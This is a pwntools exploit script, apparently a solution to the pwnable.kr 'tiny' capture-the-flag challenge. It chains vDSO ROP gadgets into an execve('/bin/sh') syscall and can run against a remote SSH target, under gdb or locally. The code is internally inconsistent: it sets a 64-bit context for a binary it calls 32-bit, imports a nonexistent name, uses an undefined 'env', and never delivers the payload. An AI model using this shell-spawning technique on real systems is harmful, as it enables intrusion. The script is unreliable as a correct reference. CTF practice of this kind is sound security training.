from pwn import *
from pwnlib.asm import environ;

vDSO_base = 0xf7ffc000;

context.arch="amd64"
context.kernel="amd64"
context.os="linux"


binary_name = "tiny"
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)

context.binary = e

# the binary is 32 bit, so we will use int 0x80 and not syscall;
syscall_addr = vDSO_base+  0x00000577;
pop_ebx_esi_ebp = vDSO_base+0x00001aad;
pop_edx_ecx = vDSO_base+0x0000057a;
pop_eax = 0x8048074;
bin_sh_chain_4000=b"/"*(0x1000-len("bin/sh")) +b"bin/sh";

bin_sh=b"/bin/sh";

garbage = 0xdeadbeef;


# split in two for readability;

payload1 = flat(pop_ebx_esi_ebp,bin_sh,garbage,garbage,pop_edx_ecx,0x0,0x0);
# payload 1 sets 3 out of 4 registers, and has padding to deal with sub 0x1000;
payload2 = flat(pop_eax,0x0b,syscall_addr);
# payload 2 sets eax;

final_payload = payload1+payload2;

print(final_payload)

argv = [final_payload]

def main():
    if(len(sys.argv) <2):
        print("Need to specify target.")
    else:
        if(sys.argv[1] == "remote"):
            s = ssh(user='',host='pwnable.kr',port=2222,password='guest') 
            p= s.process(f"./{binary_name}") 
        elif(sys.argv[1] == "gdb"):
            p = gdb.debug([f"./{binary_name}"] + argv,env=None, gdbscript="b *0x8048074", aslr=False)
        else:
            p = process([f"./{binary_name}"] + argv, env=env)


# Stack layout(0x0 is defined as the first env_var ):;

# 0x0 : argc  ->  will be popped into eax;
# 0x1: pop_ebx_esi_ebp -> will be popped into edx(it's dereferencing a ptr to a string);
# .....;
# 0x1000 byte long padding (minus two pops) (each env variable here will have /bin/sh);
# 0xFF8: 0x500 (hope to hit one of the /bin/sh strings);
# padding;
# padding;
# 0x1000: pop_edx_ecx;
# 0x1004: 0;
# 0x1008: 0;
# 0x100B: syscall_addr;



main();
